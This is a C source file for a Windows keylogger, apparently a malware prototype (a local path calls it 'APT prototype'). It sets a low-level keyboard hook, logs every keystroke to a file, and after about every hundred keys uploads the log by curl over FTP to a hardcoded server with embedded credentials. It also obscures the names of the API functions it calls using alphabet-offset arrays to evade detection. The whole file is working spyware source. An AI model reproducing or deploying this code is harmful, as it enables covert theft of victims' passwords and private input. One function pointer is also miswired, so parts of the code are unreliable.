#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#include "native.h"

HHOOK hHook;
FILE *logFile = NULL; // File to log keystrokes



HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	//printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p]\n", Module_Name, hModule);
	return hModule;
}
char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

int report(){
    
	
	//static int fileCounter = 1;
    
	
	if (logFile != NULL) {
        fclose(logFile);
        logFile = NULL; // Reset the file pointer
    }
	
	//HINTERNET hInternet, hFtpSession;
    const char *server = "192.168.100.13"; // Replace with your FTP server
    const char *username = "ftp_user_billy";        // Replace with your FTP username
    const char *password = "changeme";        // Replace with your FTP password
    const char *localFile = "C:\\Users\\ameru\\Desktop\\malware\\APT prototype\\log.log";  // Local file to upload
    const char *remoteFile = "log.log";             // Remote file name
	char curlCommand[512];
	//char remoteFile[256];
    //snprintf(remoteFile, sizeof(remoteFile), "keylog%d.log", fileCounter);
    snprintf(curlCommand, sizeof(curlCommand),
             "curl.exe -T \"%s\" ftp://192.168.100.13/upload/%s --user ftp_user_billy:changeme --silent",
             localFile, remoteFile);
			 
    int result = system(curlCommand);
    if (result != 0) {
		//printf("Error uploading file using curl. Command: %s\n", curlCommand);
        return 1;
    }

	// NOT GOOD AS IT PROMPTS FOR UAC
	/*
    // Initialize WinINet
    hInternet = InternetOpen("FTP Upload", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Error initializing InternetOpen\n");
        return 1;
    }

    // Connect to FTP server
    hFtpSession = InternetConnect(hInternet, server, INTERNET_DEFAULT_FTP_PORT, username, password, INTERNET_SERVICE_FTP, 0, 0);
    if (hFtpSession == NULL) {
        printf("Error connecting to FTP server\n");
        InternetCloseHandle(hInternet);
        return 1;
    }
    // Log in to FTP server
    if (!FtpSetCurrentDirectory(hFtpSession, "/upload")) {  // Navigate to root directory
        printf("Error setting current directory\n");
        InternetCloseHandle(hFtpSession);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Upload the file
    if (!FtpPutFile(hFtpSession, localFile, remoteFile, FTP_TRANSFER_TYPE_BINARY, 0)) {
        printf("Error uploading file\n");
        InternetCloseHandle(hFtpSession);
        InternetCloseHandle(hInternet);
        return 1;
    }
	*/

    //printf("File uploaded successfully\n");

    // Close the FTP session and Internet handle
	//fileCounter++;
    return 0;
}
void LogKeystroke(DWORD key) {
    static int i = 0;
	
	if (logFile == NULL) {
        logFile = fopen("log.log", "a"); // Open the log file in append mode
        if (logFile == NULL) {
            //printf("Failed to open log file! Error\n");
            return;
        }
    }
		switch(key){
			case VK_BACK:
				fprintf(logFile, "[BACKSPACE]");
				fflush(logFile);	
				break;
			case VK_TAB:
				fprintf(logFile, "[TAB]");
				fflush(logFile);
				break;
			case VK_RETURN:
				fprintf(logFile, "[ENTER]\n");
				fflush(logFile);
				break;
			case VK_LSHIFT:
				fprintf(logFile, "[L-SHIFT]");
				fflush(logFile);
				break;
			case VK_RSHIFT:
				fprintf(logFile, "[R-SHIFT]");
				fflush(logFile);
				break;
			case VK_RCONTROL:
				fprintf(logFile, "[R-CTRL]");
				fflush(logFile);
				break;
			case VK_LCONTROL:
				fprintf(logFile, "[L-CTRL]");
				fflush(logFile);
				break;
			case VK_MENU:
				fprintf(logFile, "[ALT]");
				fflush(logFile);
				break;
			case VK_CAPITAL:
				fprintf(logFile, "[TAB]");
				fflush(logFile);
				break;
			case VK_NUMPAD0:
				fprintf(logFile, "0");
				fflush(logFile);
				break;
			case VK_NUMPAD1:
				fprintf(logFile, "1");
				fflush(logFile);
				break;
			case VK_NUMPAD2:
				fprintf(logFile, "2");
				fflush(logFile);
				break;				
			case VK_NUMPAD3:
				fprintf(logFile, "3");
				fflush(logFile);
				break;
			case VK_NUMPAD4:
				fprintf(logFile, "4");
				fflush(logFile);
				break;
			case VK_NUMPAD5:
				fprintf(logFile, "5");
				fflush(logFile);
				break;
			case VK_NUMPAD6:
				fprintf(logFile, "6");
				fflush(logFile);
				break;
			case VK_NUMPAD7:
				fprintf(logFile, "7");
				fflush(logFile);
				break;
			case VK_NUMPAD8:
				fprintf(logFile, "8");
				fflush(logFile);
				break;
			case VK_NUMPAD9:
				fprintf(logFile, "9");
				fflush(logFile);
				break;		
			default:
				fprintf(logFile, "%c", key);
				fflush(logFile); // Flush the buffer to ensure the key is written to the file
				break;
		}
		if (i == 100){
			fflush(logFile);
			report();
			i = 0;
		}
		i++;
		
}

LRESULT CALLBACK Hook_proc(
  int nCode, 
  WPARAM wParam, 
  LPARAM lParam
)
{
	
	KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *) lParam;
	if (wParam == WM_KEYDOWN){
		
		switch(pKey->vkCode){
			case VK_BACK:
				//printf("[BACKSPACE]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_TAB:
				//printf("[TAB]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_LSHIFT:
				//printf("[L-SHIFT]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_RSHIFT:
				//printf("[R-SHIFT]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_RETURN:
				//printf("[ENTER]\n");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_RCONTROL:
				//printf("[R-CTRL]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_LCONTROL:
				//printf("[L-CTRL]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_MENU:
				//printf("[ALT]");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_CAPITAL:
				//printf("[TAB]");
				LogKeystroke(pKey->vkCode);
				break;
				
			case VK_NUMPAD0:
				//printf("0");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD1:
				//printf("1");
				LogKeystroke(pKey->vkCode);
				break;
				
			case VK_NUMPAD2:
				//printf("2");
				LogKeystroke(pKey->vkCode);
				break;
				
			case VK_NUMPAD3:
				//printf("3");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD4:
				//printf("4");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD5:
				//printf("5");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD6:
				//printf("6");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD7:
				//printf("7");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD8:
				//printf("8");
				LogKeystroke(pKey->vkCode);
				break;
			case VK_NUMPAD9:
				//printf("9");
				LogKeystroke(pKey->vkCode);
				break;		
				
			default:
				//printf("%c",pKey->vkCode);	
				LogKeystroke(pKey->vkCode);
				break;
		}
		
	}
	

   return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void){
	
	
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
	
	int set_h_0_k_offset[] = {44,4,19,48,8,13,3,14,22,18,33,14,14,10,30,23,26};		//SetWindowsHookExA
	int un_h_0_k_offset[] = {46,13,7,14,14,10,48,8,13,3,14,22,18,33,14,14,10,30,23};	//UnhookWindowsHookEx
	int gt_m__5__g_offset[] = {32,4,19,38,4,18,18,0,6,4};								//GetMessage
	
	int trn_m__5__g_offset[] = {45,17,0,13,18,11,0,19,4,38,4,18,18,0,6,4};			//TranslateMessage
	int dis_m__5__g_offset[] = {29,8,18,15,0,19,2,7,38,4,18,18,0,6,4};				//DispatchMessage
	//int cll_nxt_h_0_k_3x_offset[] = {28,0,11,11,39,4,23,19,33,14,14,10,30,23};		//CallNextHookEx
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};						//LoadLibraryA
	int us__32_d_11_offset[] = {20,18,4,17,55,54,62,3,11,11};						//user32.dll
	
	HMODULE hK32 = Get_Module(L"Kernel32");
	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//

	// --- START LOAD user32 DLL --- //
	HMODULE hdll_us_32 = L_0_D_LIB(GetOriginal(us__32_d_11_offset,ALL_ALPHANUM,sizeof(us__32_d_11_offset)));
	if (hdll_us_32 == NULL){
		//printf("[x] COULD NOT LOAD user32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(us__32_d_11_offset,ALL_ALPHANUM,sizeof(us__32_d_11_offset)),hdll_us_32);
	// --- END LOAD user32 DLL ---//
	//printf("[+] populating prototypes...\n");
	FARPROC set_h_0_k_func = GetProcAddress(hdll_us_32,GetOriginal(set_h_0_k_offset,ALL_ALPHANUM,sizeof(set_h_0_k_offset))); //SetWindowsHookExA
	FARPROC un_h_0_k_func = GetProcAddress(hdll_us_32,GetOriginal(un_h_0_k_offset,ALL_ALPHANUM,sizeof(un_h_0_k_offset))); //UnhookWindowsHookEx
	FARPROC gt_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(gt_m__5__g_offset,ALL_ALPHANUM,sizeof(gt_m__5__g_offset))); //GetMessage
	FARPROC trn_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(trn_m__5__g_offset,ALL_ALPHANUM,sizeof(trn_m__5__g_offset))); //TranslateMessage
	FARPROC dis_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(trn_m__5__g_offset,ALL_ALPHANUM,sizeof(trn_m__5__g_offset))); //DispatchMessage

	//printf("[+] prototypes are ready...\n");
	
	hHook = set_h_0_k_func(WH_KEYBOARD_LL,Hook_proc,NULL,0);
	if (hHook == NULL){
		//printf("[x] HOOK wasn't installed\n");
		return 1;
		}
	//printf("[+] HOOK installed successfully\n");
	
	//printf("[+] before get message\n");
	MSG msg;
    while( ( GetMessage(&msg, NULL, 0, 0 )) != 0)
    { 
		//printf("[+] before translate message\n");
		trn_m__5__g_func(&msg); 
		//printf("[+] before dispatch message\n");
		dis_m__5__g_func(&msg); 
     
    }
CLEANUP:
	if (hHook){
		un_h_0_k_func(hHook);
		//printf("[+] HOOK removed successfully\n");
		}
	return 0;
}
